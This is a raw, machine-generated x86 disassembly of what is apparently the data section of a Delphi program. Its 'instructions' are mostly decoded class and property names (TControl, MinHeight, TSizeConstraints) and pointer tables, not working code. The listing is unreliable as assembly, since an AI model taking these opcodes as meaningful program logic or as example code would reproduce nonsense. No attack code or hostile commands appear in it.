add al dh
push 0x44
add [ ebp + edx * 4 - 0x6b97ffbd ] ch
inc ebx
add [ ebx + ebp * 2 ] ch
inc esp
add [ eax + 0x6b ] al
inc esp
add [ eax + 0x68004394 ] ah
imul eax [ eax + eax - 0x4 ] 0xffffff94
inc ebx
add [ eax + 0x6b ] dh
inc esp
add [ edx * 4 + 0x6b780043 ] bl
inc esp
add [ eax ] dh
xchg esi eax
inc ebx
add [ eax ] dl
xchg esi eax
inc ebx
add [ eax - 0x6a ] dl
inc ebx
add [ edx * 4 + 0x6b8c0043 ] bh
inc esp
add [ eax + 0x6000446b ] dl
xchg ebp eax
inc ebx
add al dl
xchg edx eax
inc ebx
add [ edx ] dl
push esp
inc ebx
outsd
outsb
je r-xdata
inc ecx
outsd
insb
jae r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
insb
jae r-xdata
push edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
inc ebx
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
nop
add [ eax + eax ] dl
add bh bh
adc al 0x92
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
lea eax [ eax ]
in al 0x58
inc ebx
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x43579074
jb r-xdata
popad
js r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
hlt
outsd
insb
inc ebx
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
mov [ esi + 0x43 ] ss
add [ ebx ] cl
jae r-xdata
push esi
inc ebx
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebp + 0x55800040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
push ebp
inc ebx
add [ eax + eax ] bl
add [ eax ] al
int3
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x43595cc0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
add [ eax ] cl
add [ eax ] al
call [ edx + edx * 4 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
js r-xdata
add [ eax + 0x8004357 ] dl
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
push edi
inc ebx
add [ eax ] dl
add [ eax ] al
call [ edx + edx * 4 ]
imul ebp [ esi + 0x74 ] 0x4357fc73
add [ eax ] dh
push ds
inc ecx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
sub [ eax + 0x43 ] bl
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jae r-xdata
jb r-xdata
jpe r-xdata
imul ebp [ edi + 0x6e ] 0x5738c08b
inc ebx
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
add [ ecx ] al
add [ eax ] al
lea eax [ eax ]
fcom [ esi + 0x43 ]
insb
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
imul esp [ edi + 0x68 ] 0x43579074
imul esp [ gs : edi + 0x68 ] 0x43579074
add [ eax + eax ] cl
add bh bh
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
inc ebx
outsd
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
jae r-xdata
insb
jae r-xdata
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
inc ebx
add [ eax + 0x10004391 ] dl
add eax 0x0
inc ebx
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
outsb
jae r-xdata
imul ebp [ esi + 0x64 ] 0x1
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
outsb
mov eax eax
cmp [ edi + 0x43 ] dl
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx + edx ] al
inc eax
add [ eax + 0x10 ] ch
inc eax
add [ esi + edx + 0xc900041 ] al
pop edx
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
dec esp
popad
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
add [ ebx ] al
add [ eax ] al
add [ edi + edx * 2 ] dh
inc ebx
add [ esi ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
add [ fs : eax ] eax
add [ eax ] al
outsd
insb
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
popad
outsb
add [ ecx + edx ] al
inc eax
add [ ecx + edx ] al
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
push esp
dec ebx
jns r-xdata
push 0x84004010
push ss
inc ecx
add [ eax + r-xdata ] dl
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax + 0x56 ] dl
inc ebx
add [ eax ] cl
insd
dec ebp
popad
outsb
jne r-xdata
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebx
imul ebp [ esi + 0x64 ] 0x1
inc eax
add ah bl
push esi
inc ebx
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
je r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + edx ] bh
add al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
inc ebx
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ esi + edx * 2 + 0x10000043 ] cl
inc eax
add [ eax + r-xdata ] dl
or [ esi ] cl
push esp
inc esp
jb r-xdata
cmp al 0x10
outsb
je r-xdata
add al 0x11
inc eax
add [ esi + edx + 0x103c0041 ] al
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0x59c00040 ] cl
inc ebx
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
jb r-xdata
add al 0x11
inc eax
add [ ecx + edx * 2 ] ch
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
or [ esi ] cl
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
cmp al 0x10
inc ebx
add [ eax + 0x5b ] bh
inc ebx
add [ eax ] cl
or eax 0x646e4554
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
sub al 0x51
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
outsb
je r-xdata
je r-xdata
jb r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ecx + edx ] al
inc eax
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
dec eax
pop edx
inc ebx
add [ eax ] cl
push cs
push esp
inc ebx
push 0x4007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp + 0x5a480040 ] cl
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
add al 0x11
inc eax
add ah cl
push ebx
inc ebx
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0x5c3c0040 ] cl
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add ah dl
pop ebx
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add al 0x11
inc eax
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
push ebx
add ecx [ eax ]
push es
add al 0x11
inc eax
add [ eax ] dl
push esi
inc ebx
add [ esi + edx + 0x103c0041 ] al
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0x5b300040 ] cl
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
add al 0x11
inc eax
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] al
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
or [ esp + edx * 2 ] cl
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
inc eax
add ah cl
push ebx
inc ebx
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ esi + edx * 2 + 0x10000043 ] cl
inc eax
add [ eax + r-xdata ] dl
add al 0x11
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
int3
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx ] al
inc eax
add [ ebx ] ah
inc ebx
add ah cl
imul eax [ ebx ] r-xdata
cmp [ ebp + 0x43 ] bl
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ ebx ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
adc [ esi + 0x43 ] bl
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
inc ebx
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x435f98c0 ] cl
push edi
push 0x456c6565
jbe r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x435f10c0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
inc ebp
jbe r-xdata
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx ] bh
outsb
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
push 0x6e490774
je r-xdata
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x61 ] dl
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
jo r-xdata
je r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
push esp
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
sbb [ esi + 0x43 ] 0x0
or [ edi ] dl
jb r-xdata
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ eax ] al
loopne r-xdata
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
jbe r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
cwde
pop edi
inc ebx
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
add al 0x11
inc eax
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ esi + eax * 2 + 0x41 ] dl
add [ esi + eax * 8 ] ch
inc ebx
add [ eax - 0x66 ] al
inc ebx
add [ ecx + ebx * 4 - 0x5ca7ffbd ] ch
inc ebx
add al bl
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffff96700041 ]
inc ebx
add ah dh
mov ah 0x43
add al dh
mov ah 0x43
add al al
mov ch 0x43
add [ eax + ebx * 4 - 0x6007ffbd ] dh
inc ebx
add [ edi + ebx * 4 + 0x43 ] bl
add [ eax + ebp * 4 - 0x6803ffbd ] al
inc ebx
add [ eax ] al
cwde
inc ebx
add ah bh
mov [ ebx ] sub_43c828
inc eax
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ esp + 0x43 ] al
add [ eax - 0x59 ] bl
inc ebx
add [ esi ] al
inc ebx
add al dh
mov bh 0x43
add [ eax + ecx * 8 - 0x55bbffbd ] ch
inc ebx
add [ eax + 0x2c0043aa ] bh
fwait
inc ebx
add [ eax + 0xe0043aa ] bl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x800040 ] ah
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] al
push esp
add [ eax ] eax
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
inc ebx
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
test [ ecx + 0x31300043 ] bh
inc eax
add [ ecx + esi + 0x40 ] cl
inc ecx
add al al
mov eax [ 0x33ec0041 ]
inc eax
jo r-xdata
add al ah
sub [ ecx ] al
shl [ ecx + 0x33ec0041 ] 0x40
inc ebp
js r-xdata
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
outsb
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
inc ebx
lea eax [ eax ]
mov al 0x60
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] bh
inc ebx
add [ eax ] ch
arpl [ ebx ] ax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esi
popad
jbe r-xdata
add [ edx ] bl
arpl [ ebx ] ax
pop esp
add [ eax ] eax
outsb
je r-xdata
add al 0x8
push es
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ esi + edx + 0x103c0041 ] al
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
dec ebp
outsd
jne r-xdata
je r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ esi + edx + 0x41 ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax ] cl
inc ebx
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
adc [ eax ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
add [ eax - 0x69 ] cl
inc ebx
add [ esi + eax * 8 + 0x43 ] ah
add [ edx + edi * 4 + 0x43 ] bl
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_43625a
in al 0xc3
inc ebx
add al bh
rol [ ebx ] 0x78
rol [ ebx ] 0x9c
rol [ ebx ] 0xe8
enter 0x43 0x44
les eax [ ebx ]
xor al cl
inc ebx
add [ eax ] al
lodsb [ esi ]
inc ebx
add [ ecx - 0x4553ffbd ] cl
inc ebx
add [ esi + esi * 4 ] bl
inc ebx
add [ eax ] bl
mov ebx 0xb02c0043
inc ebx
add [ eax - 0x52 ] dh
inc ebx
add [ eax ] dl
0x43
sub_436430
in al dx
sahf
inc ebx
add ah cl
lds eax [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
or ecx [ eax + 0x65 ]
insb
jo r-xdata
add [ 0x240043 ] bh
add [ eax ] al
xor al 0x55
inc ebx
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
jns r-xdata
inc ebx
add al ah
mov [ 0xffffffff94d40041 ] al
inc ebx
add [ ebx ] dl
inc ecx
add [ eax + 0x64004395 ] al
mov [ 0xffffffffa2f80041 ] al
inc ecx
add [ ebx + 0x41 ] cl
outsd
jb r-xdata
jbe r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x6558c08b
inc ebx
add [ edx ] cl
or [ ecx + ecx * 2 + 0x6d ] dl
inc eax
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
lodsb [ esi ]
mov [ 0xffffffffca500041 ] al
pushfd
push ss
inc ecx
add [ eax + 0x1 ] bl
add bh bh
fcomp [ esi - 0x3a33ffbd ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
outsd
outsb
je r-xdata
jo r-xdata
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0x105
add bh bh
jb r-xdata
xor eax [ eax ]
xor [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] cl
add [ edx - 0x35afffbf ] ch
outsd
outsb
je r-xdata
add al al
sahf
outsd
insb
jae r-xdata
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffffca840041 ]
inc ebx
add [ ebx + edx + 0x18a00044 ] al
inc esp
add ah ch
pop ss
inc esp
add [ eax + ebx * 4 + 0xe000043 ] dh
inc esp
add [ eax ] ah
push cs
inc esp
add [ eax ] bh
or eax [ eax + eax - 0x4 ]
xchg edi eax
inc ebx
add [ eax ] al
cwde
inc ebx
add ah bh
mov [ ebx ] sub_43c828
inc eax
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ esp + 0x43 ] al
add [ eax - 0x59 ] bl
inc ebx
add [ esi ] al
inc ebx
add [ edi + 0x43 ] ch
add [ eax + ecx * 8 + 0xb8c0043 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] ch
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ ecx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add al al
xchg ebx eax
inc ebx
add [ edx + ebp * 2 - 0x6bcbffbc ] dh
add al bh
mov [ 0xffffffffa34c0041 ] al
inc ecx
js r-xdata
push esp
inc ebx
add ah ah
fild [ ebx ]
loopne r-xdata
inc ebx
add al dl
imul eax [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
inc ebx
add [ eax ] al
add [ eax ] al
sub al 0x67
add bh bh
jmp [ esi + 0x43 ]
add [ esi + 0x4004369 ] bh
inc ebx
outsd
insb
jae r-xdata
add al [ eax ]
add [ eax + 0x43 ] ah
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
shr al 0x1
inc ebx
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
test al 0xcb
inc ebx
add [ eax + 0x18 ] dh
inc esp
add [ eax + 0x540043e0 ] bl
inc esi
inc ecx
add [ esi + eax * 8 ] ch
inc ebx
add [ eax - 0x66 ] al
inc ebx
add [ ebp + ecx * 8 + 0x43 ] cl
add [ eax - 0x5d ] bl
inc ebx
add al bl
mov eax [ 0xffffffff9ec00041 ]
mov esi 0x4004369
inc ebx
add ah bl
push 0x44
add [ edx + ecx * 8 + 0x43 ] dh
add [ ebp + edx * 4 - 0x6b97ffbd ] ch
inc ebx
add [ ebx + ebp * 2 ] ch
inc esp
add [ eax + 0x6b ] al
inc esp
add [ eax + 0x68004394 ] ah
imul eax [ eax + eax - 0x4 ] 0xffffff94
inc ebx
add [ eax + 0x6b ] dh
inc esp
add [ edx * 4 + 0x6b780043 ] bl
inc esp
add [ edx + ecx * 8 + 0x43 ] bh
add [ eax ] dl
xchg esi eax
inc ebx
add [ eax - 0x6a ] dl
inc ebx
add [ edx * 4 + 0x6b8c0043 ] bh
inc esp
